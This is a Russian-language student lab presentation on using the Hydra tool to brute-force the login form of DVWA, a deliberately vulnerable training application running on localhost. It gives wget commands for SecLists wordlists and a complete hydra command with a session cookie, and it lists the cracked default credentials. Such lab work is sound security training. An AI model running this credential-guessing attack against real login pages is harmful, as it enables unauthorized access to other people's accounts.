---
## Front matter
lang: ru-RU
title: Индивидуальный проект. Этап 3
subtitle: 
author:
  - Матюхин Г.В.
institute:
  - Российский университет дружбы народов, Москва, Россия
date: 28 сентября 2024

## i18n babel
babel-lang: russian
babel-otherlangs: english

## Formatting pdf
toc: false
toc-title: Содержание
slide_level: 3
aspectratio: 169
section-titles: true
theme: metropolis
header-includes:
 - \metroset{progressbar=frametitle,sectionpage=progressbar,numbering=fraction}
---

# Цель работы

Использование Hydra

- Hydra используется для подбора или взлома имени пользователя и пароля.
- Поддерживает подбор для большого набора приложений.

# Выполнение лабораторной работы

Будем подбирать пароль для уязвимости "Brute Force" в DVWA с низким (low) уровнем безопастности.

## Получить словари имен пользователей и паролей

Возьмем данные из [SecLists](https://github.com/danielmiessler/SecLists).

## Пароли:
```bash
$ wget https://raw.githubusercontent.com\
    /danielmiessler/SecLists/refs/heads/master\
    /Passwords/Common-Credentials/common-passwords-win.txt
```

## Имена пользователей:
```bash
$ wget https://raw.githubusercontent.com\
    /danielmiessler/SecLists/refs/heads/master\
    /Usernames/cirt-default-usernames.txt
```

# Изучим цель

## Эндпоинт
При низком уровне безопастности форма для подбора отправляет один `GET` запрос на
`/vulnerabilities/brute/?username=<USERNAME>&password=<USERNAME>&Login=Login`.

## Определяем успех

При успехе на странице появляется текст "Welcome to the password protected area".

## Логинимся в DVWA

- необходимо быть залогиненым в DVWA,
- зайдем с именем `amdin` и паролем `password`.
- Нам нужно значение Cookie `PHPSESSID`
- Нам нужно значение Cookie `security`

# Выполнение атаки

## Команда

```bash
$ hydra \
    -L cirt-default-usernames.txt \
    -P common-passwords-win.txt \
    -o ./brute.log \
    -R \
    -s 4280 127.0.0.1 \
    http-get-form \
    "/vulnerabilities/brute/:\
    username=^USER^&password=^PASS^&Login=Login:\
    H=Cookie\: security=low;PHPSESSID=68359d81ce7b2ad7cbd0079cb3336560:\
    S=Welcome to the password protected area"
```

## Наденные пароли

- `admin`, `password`
- `ADMIN`, `password`
- `Admin`, `password`

# Выводы

На данном этапе проекта я научился пользоваться `hydra` для подбора паролей к веб приложениям.
